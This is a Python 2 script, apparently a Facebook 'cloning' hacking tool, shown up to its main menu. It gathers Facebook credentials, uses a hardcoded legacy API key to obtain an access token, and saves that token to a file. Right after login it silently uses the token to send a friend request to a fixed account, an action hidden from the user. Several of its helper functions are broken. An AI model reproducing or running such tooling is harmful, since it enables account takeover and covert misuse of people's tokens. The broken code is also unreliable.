#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To ASHIR AZEEM
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.07)

#Dev:ASHIR_AZEEM
##### LOGO #####
logo = """
       \033[1;91m:◢▇▇◣▉◢▲▲◣▉◢▇▇◣
▇▇◢◆▉◥▇▇◤▉◆◣▇▇
▇◢◤▊▊▉◣◢▊▊▉◥◣▇
◥◥▇▇▇▇◤◥▇▇▇▇◤◤
∵◢▇◆△◆◆◆◆△◆▇◣∵
∵◢▇◆▉◆◆◆◆▉◆▇◣∵
∵◢▇◆▉◆◆◆◆▉◆▇◣∵
∵◢▇◆▉◆◆◆◆▉◆▇◣∵
∵▇▇◆▉◆◆◆◆▉◆▇▇∵
∵◥◢◆▉◆◆◆◆▉◆◣◤∵
∵◢▊▊▊▉◣◢▉▊▊▉◣∵
∵◥▇▇▇▉◤◥▉▇▇▇◤∵
∵∵◥▇▇▉◆◆▉▇▇◤∵∵
∵∵∵◤◢▅▅▅◤∵◥∵∵∵
∵∵∵∵▇▅▅▇∵∵∵∵∵∵
∵∵∵∵▇▅▅▇∵∵∵∵∵∵
∵∵∵∵▇▅▅▇∵∵∵∵∵∵
∵∵∵∵▇▅▅▇∵∵∵∵∵∵
∵∵∵∵◥▅▅▇∵∵∵∵∵∵
∵∵∵∵∵◥▅▅◣∵∵∵∵∵
∵∵∵∵∵∵◥▅▅◣∵∵∵∵
∵∵∵∵∵∵∵◥▅▅◣∵∵∵
∵∵◢▅▅◣∵∵◥▅▅◣∵∵
∵◢◤∵∵∵∵∵∵▇▅▇∵∵
∵▊∵BaaP...∵▇▅▇∵∵
∵▊∵∵Ko∵∵∵▇▅▇∵∵
∵▊∵∵Feel∵∵∵▇▅◤∵∵
∵◥◣Karo∵◢▅◤∵∵∵
∵∵◥◣∵∵∵◢▅◤∵∵∵∵
∵∵∵◥▇▇▇▅◤∵∵∵∵∵

      \033[1;92m     
     \033[1;93m:     
    \033[1;94m
   \033[1;95m:::        
  \033[1;96m::♧♧♧♧♧♧♧♧♧♧\033[1;91mWhatsapp\033[1;96m♧♧♧♧♧♧♧♧♧♧▒▒▒▒▒▒▒::::        
  \033[1;91m:》》》\033[1;93m+923094161457\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-ASHIR_AZEEM-\033[1;95m♡╭──────────•◈•──────────╮♡
\033[1;92m..........................ASHIR AZEEM.....................
\033[1;93m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   MALIK GANG
\033[1;93m╚╝ ╚═╩═╩═╩═╝═ ╚╝╚═╩═╝ 
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mASHIR_AZEEM\033[1;95m♡╰──────────•◈•──────────╯♡"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
  \033[1;96m-┈┈┈┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈         
  \033[1;96m┈┈┈┈┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈        
  \033[1;96m┈┈┈┈┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   
 \033[1;96m ┈┈┈┈┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈   
 \033[1;96m ┈┈┈┈┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈
 \033[1;96m ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈
  \033[1;96m ─────────────•◈•──────────  
   \033[1;92m███████▒▒Welcome To ASHIR AZEEM HACKING▒▒████████
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mASHIR_AZEEM\033[1;95m♡╭──────────•◈•──────────╮♡
\033[1;94mAuthor\033[1;91m: \033[1;91ASHIR__AZEEM
\033[1;94mBlackMafia\033[1;91m: \033[1;91▒▓██████████████]99.9
\033[1;94mFacebook\033[1;91m: \033[1;91ASHIR_AZEEM
\033[1;94mWhatsapp\033[1;91m: \033[1;91m+923094161457
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mASHIR_AZEEM\033[1;95m♡╰──────────•◈•──────────╯♡"""
jalan('              \033[1;96m....................ASHIR__AZEEM....................:')
jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈   ")
jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈   ')
jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   ')
jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈ ")
jalan("\033[1;93m   ┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈")
print "\033[1;93m♡─────╱▔▔▔▔┊┊┊┊▔▔▔▔╲───────♡\033[1;96mLogin ASHIR AZEEM\033[1;95m♡╰──────────•◈•──────────╯♡"

CorrectUsername = "ASHIR"
CorrectPassword = "ASHIR"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m🔐 \x1b[1;91mTool Username \x1b[1;91m»» \x1b[1;93m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;94m🔐 \x1b[1;91mTool Password \x1b[1;91m»» \x1b[1;92m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:ASHIR_AZEEM
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;91mWrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCrV-_aYI-zEa9NSloDe9C9w ')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://www.youtube.com/channel/UCrV-_aYI-zEa9NSloDe9C9w  ')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		jalan(' \033[1;92mWarning: \033[1;97mDo Not Use Your Personal Account' )
		jalan(' \033[1;92m   Note: \033[1;97mUse a New Account To Login' )
		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mAshir__AZEEM\033[1;95m♡──────────•◈•──────────♡"
		print('	   \033[1;94m♡\x1b[1;91m》》》》》》LOGIN WITH FACEBOOK《《《《《《\x1b[1;94m♡' )
		print('	' )
		id = raw_input('\033[1;96m[+] \x1b[1;92mID/Email\x1b[1;95m: \x1b[1;96m')
		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;96m: \x1b[1;96m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;96mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successful...'
				os.system('')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;91mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;92mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:ASHIR_AZEEM
	print logo
	print "  \033[1;95m«-----♡----\033[1;93mLogged in User Info\033[1;95m----♡-----»"
	print "	   \033[1;94m Name\033[1;93m:\033[1;92m"+nama+"\033[1;97m               "
	print "	   \033[1;97m ID\033[1;93m:\033[1;92m"+id+"\x1b[1;97m              "
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mASHIR__AZEEM\033[1;95m♡──────────•◈•──────────♡"
	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."
	print "\033[1;97m--\033[1;91m> \033[1;91m0.
